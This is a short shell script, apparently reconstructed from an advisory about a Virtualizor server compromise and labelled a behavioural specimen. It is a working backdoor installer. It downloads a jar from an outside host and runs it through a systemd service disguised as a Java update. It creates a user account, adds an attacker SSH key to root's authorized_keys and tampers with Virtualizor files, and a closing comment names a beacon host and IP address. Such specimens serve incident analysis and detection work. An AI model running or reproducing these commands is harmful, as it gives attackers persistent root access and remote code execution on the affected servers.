#!/bin/sh
# reconstructed from Virtualizor BGP-hijack advisory (behavioural specimen, not a real payload)
if ! command -v java >/dev/null 2>&1; then apt-get install -y openjdk-17-jre-headless; fi
curl -s https://cdn.nerat.cc/j/upd.jar -o /opt/.jre/upd.jar
useradd -m -s /bin/bash proxyuser
echo "ssh-ed25519 AAAA... attacker" >> /root/.ssh/authorized_keys
cat > /etc/systemd/system/java-jre-update.service <<UNIT
[Service]
ExecStart=/usr/bin/java -jar /opt/.jre/upd.jar
UNIT
systemctl enable --now java-jre-update.service
# tamper markers
sed -i 's/$/ /' /usr/local/virtualizor/globals.php
touch /usr/local/virtualizor/_universal.php
# beacon connect.ne-rat.xyz  193.32.127.248
